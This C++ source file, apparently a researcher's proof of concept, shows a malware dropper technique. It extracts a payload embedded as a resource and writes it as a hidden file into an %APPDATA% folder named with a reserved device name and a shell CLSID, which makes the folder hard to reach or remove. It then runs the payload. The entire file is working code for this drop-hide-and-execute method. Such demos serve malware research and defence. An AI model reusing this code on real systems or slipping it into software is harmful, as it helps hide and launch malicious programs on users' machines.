// Drops a demo payload in a restricted directory, and runs it.
// CC-BY hasherezade

#include <windows.h>
#include "resource.h"

#include <string>
#include <iostream>
#include "install.h"

BOOL writeToFile(char* res_data, DWORD res_size, const char *payloadName)
{
    HANDLE hFile = CreateFile(payloadName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
    if (hFile == NULL) return FALSE;

    DWORD written = 0;
    BOOL isDropped = WriteFile(hFile, res_data, res_size, &written, NULL);
    CloseHandle(hFile);

    if (isDropped == TRUE) {
        if (res_size != written) { //failed to write full buffer
            DeleteFile(payloadName);
            return FALSE;
        }
    }
    return TRUE;
}

BOOL dropResource(const char *payloadName, int res_id)
{
    HMODULE hInstance = GetModuleHandle(NULL);
    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(res_id), RT_RCDATA);
    if (!res) return FALSE;

    HGLOBAL res_handle  = LoadResource(NULL, res);
    if (res_handle == NULL) return FALSE;

    char* res_data = (char*) LockResource(res_handle);
    DWORD res_size = SizeofResource(NULL, res);

    /* you can now use the resource data */
    BOOL isDropped = writeToFile(res_data, res_size, payloadName);

    /* free resource after using*/
    FreeResource(res_handle);
    return isDropped;
}

int main(int argc, char *argv[])
{
    const char demoExe[] = "demo.exe";

    LPSTR installFolder = "con.{ED7BA470-8E54-465E-825C-99712043E01C}";
    LPSTR installPath = new char[MAX_PATH];
    if (!make_install_folder("%APPDATA%", installFolder, installPath)) {
        std::cerr << "Could not create a folder!\n";
        return -1;
    }
    std::cout << "Created a directory: " << installPath << "\n";

    //test the path - can create a file there?
    char payloadPath[MAX_PATH] = { 0 };
    if (!join_strings(installPath, demoExe, "\\", payloadPath)) {
        printf("[-] Creating payload path failed!\n");
        return -2;
    }
    std::cout << "Created payload path: " << payloadPath << "\n";
    if (dropResource(payloadPath, MY_RESOURCE1) == FALSE) {
        printf("[-] Dropping DLL failed!\n");
        return (-3);
    }
    PROCESS_INFORMATION pi = { 0 };
    std::cout << "Dropped the payload: " << payloadPath << "\n";
    bool is_run = create_new_process(pi, NULL, payloadPath, NULL);
    if (!is_run) {
        std::cerr << "Payload could not run!\n";
    }
    system("pause");
    return 0;
}
